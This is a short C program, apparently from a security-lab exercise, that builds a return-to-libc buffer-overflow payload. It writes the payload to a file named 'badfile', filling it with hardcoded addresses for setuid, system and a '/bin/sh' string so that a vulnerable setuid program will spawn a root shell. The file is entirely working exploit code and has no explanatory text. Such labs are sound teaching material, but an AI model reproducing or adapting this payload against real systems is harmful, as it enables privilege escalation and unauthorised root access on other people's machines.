/* exploit.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define SHELL_LOC 0xbfffff5d
#define SET_UID_LOC 0xb7e1b170
#define EXIT_LOC 0xb7d989d0
#define SYS_LOC 0xb7da4da0
#define EBP 72
int main(int argc, char **argv)
{
	int offset = atoi(argv[1]);
	printf("%i \n", offset);
	char buf[300];
	FILE *badfile;
	badfile = fopen("./badfile", "w");
	*(long *) &buf[EBP+4] = SET_UID_LOC; 
	*(long *) &buf[EBP+8] = SYS_LOC; 
	*(long *) &buf[EBP+12] = 0;
	*(long *) &buf[EBP+16] = SHELL_LOC + offset;
	fwrite(buf, sizeof(buf), 1, badfile);
	fclose(badfile);
}
